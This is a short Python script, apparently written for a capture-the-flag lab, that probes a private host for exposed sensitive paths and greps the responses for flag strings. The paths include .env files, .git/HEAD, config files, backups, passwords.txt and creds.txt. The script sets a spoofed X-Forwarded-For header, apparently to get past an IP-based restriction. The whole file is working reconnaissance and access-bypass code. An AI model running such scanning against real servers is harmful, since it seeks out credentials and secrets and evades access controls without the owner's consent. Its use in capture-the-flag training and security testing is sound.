import urllib.request

paths = [
    '/flag', '/flag.txt', '/flags', '/flag.html',
    '/wiki/flag', '/wiki/flags', '/wiki/secret', '/wiki/admin', '/wiki/backup', '/wiki/notes',
    '/vault/flag', '/vault/flag.txt', '/vault/flags', '/vault/secret', '/vault/backup', '/vault/notes',
    '/api', '/api/v1', '/api/health', '/api/flag', '/api/users', '/api/config',
    '/admin', '/admin.php', '/admin.html', '/dashboard', '/console',
    '/config', '/config.php', '/config.json', '/.env', '/.git', '/.git/HEAD',
    '/backup', '/backups', '/backup.tar.gz', '/backup.zip',
    '/secret', '/secret.txt', '/secrets', '/passwords.txt', '/creds.txt',
    '/robots.txt', '/sitemap.xml', '/debug', '/status', '/metrics', '/health'
]

headers = {'X-Forwarded-For': '192.168.60.1'}

for p in paths:
    url = f'http://192.168.60.139{p}'
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=2) as resp:
            body = resp.read().decode('utf-8', errors='ignore')
            print(f"[+] 200 OK: {p} (len {len(body)})")
            import re
            flags = re.findall(r'(?:flag|FLAG|MITIGATA)\{[^}]+\}', body)
            if flags:
                print(f"    FLAGS: {flags}")
    except urllib.error.HTTPError as e:
        if e.code not in [404, 403]:
            print(f"[*] {e.code}: {p}")
    except Exception as e:
        pass

